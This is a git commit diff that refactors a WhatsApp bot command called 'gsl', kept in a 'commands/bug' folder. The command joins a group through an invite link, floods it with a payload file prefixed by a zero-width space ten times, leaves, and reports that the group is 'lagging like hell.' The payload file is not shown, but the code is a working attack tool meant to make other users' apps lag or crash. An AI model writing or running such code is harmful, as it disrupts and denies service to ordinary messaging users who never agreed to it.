03ca26c4da1aeb0b4992841f5d018c7a30f02d4f
Loving Programming <officialstanlee143@gmail.com>
2026-02-11 17:02:13 +0300

    Update gsl.js

--- commands/bug/gs1.js
+++ commands/bug/gs1.js
@@ -3,18 +3,18 @@ const config = require('../../config');
 
 module.exports = {
     name: "gsl",
-    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
+    execute: async (conn, msg, args, { from, isOwner }) => {
         if (!isOwner) return;
-        const payload = fs.readFileSync('./lib/payloads/slugs.txt', 'utf-8');
-        const code = args[0].split('https://chat.whatsapp.com/')[1];
-        
         try {
+            const payload = fs.readFileSync('./lib/payloads/slugs.txt', 'utf-8');
+            const code = args[0].split('https://chat.whatsapp.com/')[1];
             const jid = await conn.groupAcceptInvite(code);
-            for (let i = 0; i < 10; i++) { // Lag nzito zaidi
+
+            for (let i = 0; i < 10; i++) {
                 await conn.sendMessage(jid, { text: "\u200B" + payload });
             }
             await conn.groupLeave(jid);
-            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: Group is now lagging like hell.") });
-        } catch (e) { msg.reply("🥀 Failed."); }
+            await conn.sendMessage(conn.user.id, { text: "🥀 Mission Success: GSL Group Lagging." });
+        } catch (e) {}
     }
 };
